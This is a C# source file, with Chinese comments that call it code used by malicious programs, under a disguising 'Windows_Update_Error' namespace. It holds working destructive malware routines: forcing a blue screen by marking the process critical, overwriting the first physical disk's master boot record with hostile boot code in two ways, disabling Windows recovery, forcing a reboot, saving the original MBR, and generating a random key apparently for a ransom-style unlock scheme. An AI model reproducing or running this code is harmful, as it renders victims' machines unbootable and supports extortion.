using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Windows_Update_Error
{
    // 此类包含了被恶意程序使用的与系统级别操作相关的多个方法
    public class Test
    {
        // 从kernel32.dll中导入CreateFileA函数，此函数用于创建或打开文件或I/O设备。
        // 将SetLastError设置为true，意味着当出现错误时能够获取详细的错误信息。
        [DllImport("kernel32.dll", SetLastError = true)]
        // 定义一个外部函数，用于创建或打开文件。
        // 参数lpFileName：要创建或打开的文件或设备的名称。
        // 参数dwDesiredAccess：对文件或设备期望的访问权限。
        // 参数dwShareMode：文件或设备的共享模式。
        // 参数lpSecurityAttributes：指向SECURITY_ATTRIBUTES结构的指针，用于确定文件或设备的安全属性。
        // 参数dwCreationDisposition：当文件或设备存在与否时应采取的操作。
        // 参数dwFlagsAndAttributes：文件或设备的属性及标志。
        // 参数hTemplateFile：指向模板文件的句柄（若适用）。
        private static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        // 从kernel32.dll中导入WriteFile函数，该函数用于向文件写入数据。
        [DllImport("kernel32.dll", SetLastError = true)]
        // 定义一个外部函数，用于向文件写入数据。
        // 参数hFile：要写入数据的文件句柄。
        // 参数lpBuffer：指向包含要写入数据的缓冲区的指针。
        // 参数nNumberOfBytesToWrite：要从缓冲区写入的字节数。
        // 参数lpNumberOfBytesWritten：指向一个变量的指针，该变量用于接收实际写入的字节数。
        // 参数lpOverlapped：指向OVERLAPPED结构的指针（若适用）。
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

        // 定义文件共享和访问权限相关的常量
        private const int File_Share_Read = 0x00000001;
        private const int File_Share_Write = 0x00000002;
        private const uint Generic_Read = 0x80000000;
        private const uint Generic_Write = 0x40000000;
        private const int Open_Existing = 3;

        // 从ntdll.dll中导入NtSetInformationProcess函数，此函数用于设置进程相关的信息。
        [DllImport("ntdll.dll", SetLastError = true)]
        // 定义一个外部函数，用于设置进程信息。
        // 参数hProcess：进程的句柄。
        // 参数processInformationClass：要设置的进程信息类型。
        // 参数processInformation：指向包含要设置的进程信息的缓冲区的指针。
        // 参数processInformationLength：进程信息缓冲区的长度。
        public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        // 用于触发蓝屏的方法，将当前进程标记为关键进程后退出应用程序，此操作会导致系统崩溃并出现蓝屏。
        public void Nt_Error()
        {
            // 定义表示进程为关键进程的值，此处1表示进程是关键的
            int isCritical = 1;
            // 定义用于表示BreakOnTermination的进程信息类的值，此处29代表该特定的进程信息类别
            int BreakOnTermination = 29;
            // 使用NtSetInformationProcess函数将当前进程标记为关键进程，传递当前进程的句柄、对应的进程信息类、表示关键进程的变量引用以及变量大小（以字节为单位）作为参数
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            // 退出应用程序
            Application.Exit();
        }

        // 用于修改主引导记录（MBR）的方法，构造恶意的MBR数据缓冲区并尝试将其写入磁盘，修改MBR可能导致系统无法正常启动。
        public void killmbr()
        {
            // 以下字节数组表示恶意的MBR数据内容
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            // 创建一个新的字节数组，其大小为标准的MBR大小（512字节），用于存储完整的MBR数据
            byte[] mbrdata = new byte[512];
            // 将恶意的MBR数据复制到新创建的数组中，循环遍历恶意MBR数据的每个元素进行复制
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            // 在数组末尾设置所需的MBR签名字节，这是符合MBR格式规范的必要操作
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;
            // 物理驱动器的路径，此处表示第一个物理硬盘驱动器
            string Path = @"\\.\PhysicalDrive0";
            // 使用FileStream以读写模式打开物理驱动器作为文件流，允许同时进行读和写操作
            using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                // 将构造好的恶意MBR数据写入物理驱动器，写入从索引0开始，写入的字节数为512字节
                file.Write(mbrdata, 0, 512);
            }
        }

        // 另一个用于修改主引导记录（MBR）的方法，使用Windows API调用实现，功能与killmbr类似，但实现方式不同。
        public int killmbrA()
        {
            // 用于存储实际写入字节数的变量
            int write = 0;
            // 表示空指针值的常量
            uint NULL = 0;
            // 恶意的MBR数据内容
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            // 创建一个新的字节数组，其大小为标准的MBR大小（512字节），用于存储完整的MBR数据
            byte[] mbrdata = new byte[512];
            // 将恶意的MBR数据复制到新创建的数组中，循环遍历恶意MBR数据的每个元素进行复制
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            // 在数组末尾设置所需的MBR签名字节，这是符合MBR格式规范的必要操作
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;
            // 使用CreateFileA函数打开物理驱动器，传递驱动器路径、读写访问权限、共享模式、空指针、打开模式（以存在的文件打开）、空属性以及空模板文件句柄等参数
            IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0",
                                  Generic_Read | Generic_Write,
                                  File_Share_Read | File_Share_Write,
                                  NULL, Open_Existing, NULL, 0);
            // 使用WriteFile函数将构造好的恶意MBR数据写入物理驱动器，传递文件句柄、MBR数据数组、要写入的字节数、实际写入字节数的引用以及空指针等参数，并将返回结果存储在变量x中
            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);
            // 检查写入操作是否成功，如果成功（x为true）
            if (x != false)
            {
                // 返回1表示写入操作成功
                return 1;
            }
            else
            {
                // 返回 -1表示写入操作失败
                return -1;
            }
        }

        // 用于重启计算机的方法，执行带有 /r（重启）选项和0秒延迟的关机命令，实现计算机的重启功能。
        public void Shutdown_PC()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        // 用于禁用Windows恢复环境（Windows_RE）的方法，执行带有 /disable选项的reagentc命令，以此来禁用Windows恢复环境。
        public void Disable_WinRE()
        {
            Process.Start("reagentc", "/disable");
        }

        // 用于获取主引导记录（MBR）数据的方法，尝试从物理驱动器读取MBR数据，如果不存在则先从物理驱动器读取并保存到本地文件，然后再从本地文件读取返回，若已存在则直接从本地文件读取返回。
        public static byte[] GetMbr()
        {
            // 物理驱动器的路径，此处表示第一个物理硬盘驱动器
            string path = @"\\.\PhysicalDrive0";
            // 创建一个大小为512字节的字节数组，用于存储读取到的MBR数据
            byte[] mbr = new byte[512];
            // 创建一个表示C:\bin目录的DirectoryInfo对象，后续用于操作该目录相关事宜
            DirectoryInfo directory = new DirectoryInfo(@"C:\bin");
            // 创建C:\bin目录，如果该目录不存在的话
            directory.Create();
            // 创建一个表示C:\bin\mbr.bin文件的FileInfo对象，后续用于操作该文件相关事宜
            FileInfo file = new FileInfo(@"C:\bin\mbr.bin");
            // 如果mbr.bin文件不存在
            if (file.Exists == false)
            {
                // 使用FileStream以读写模式打开物理驱动器作为文件流，允许同时进行读和写操作
                using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    // 从物理驱动器的文件流中读取MBR数据到mbr数组中，从索引0开始，读取的字节数为512字节
                    fileStream.Read(mbr, 0, 512);
                }
                // 使用FileStream以打开或创建模式打开C:\bin\mbr.bin文件作为文件流，允许同时进行读和写操作
                using (FileStream fileStream1 = new FileStream(@"C:\bin\mbr.bin", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    // 将读取到的MBR数据写入到mbr.bin文件中，从索引0开始，写入的字节数为512字节
                    fileStream1.Write(mbr, 0, 512);
                }
                // 将mbr数组中的每个元素都设置为0，清空数组内容（可能用于后续特定逻辑）
                for (int i = 0; i < 512; i++)
                {
                    mbr[i] = 0;
                }
            }
            // 使用FileStream以打开模式打开C:\bin\mbr.bin文件作为文件流，允许同时进行读和写操作
            using (FileStream fileStream2 = new FileStream(@"C:\bin\mbr.bin", FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                // 从mbr.bin文件的文件流中读取MBR数据到mbr数组中，从索引0开始，读取的字节数为512字节
                fileStream2.Read(mbr, 0, 512);
            }
            // 返回获取到的MBR数据数组
            return mbr;
        }

        // 用于将传入的MBR数据写入物理驱动器的方法，打开物理驱动器并将传入的MBR数据写入其中。
        public void WriteMbr(byte[] mbr)
        {
            // 物理驱动器的路径，此处表示第一个物理硬盘驱动器
            string path = @"\\.\PhysicalDrive0";
            // 使用FileStream以打开模式打开物理驱动器作为文件流，允许同时进行读和写操作
            using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                // 将传入的MBR数据写入物理驱动器的文件流中，从索引0开始，写入的字节数为512字节
                fileStream.Write(mbr, 0, 512);
            }
        }

        // 用于生成随机密钥的静态方法，通过随机选择字符组成指定长度的字符串作为密钥。
        public static string Random_Key()
        {
            // 创建一个Random对象，用于生成随机数
            Random random = new Random();
            // 将包含大小写字母和数字的字符串转换为字符数组，作为生成密钥的字符来源
            char[] KEYChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".ToCharArray();
            // 创建一个长度为27的字符数组，用于存储生成的密钥字符
            char[] Key = new char[27];
            // 循环27次，每次生成一个随机索引，从KEYChar字符数组中选取对应字符放入Key数组中，以此构建密钥字符串
            for (int i = 0; i < 27; i++)
            {
                int index = random.Next(0, KEYChar.Length);
                Key[i] = KEYChar[index];
            }
            // 将生成的字符数组转换为字符串并返回，作为随机生成的密钥
            return new string(Key);
        }
    }
}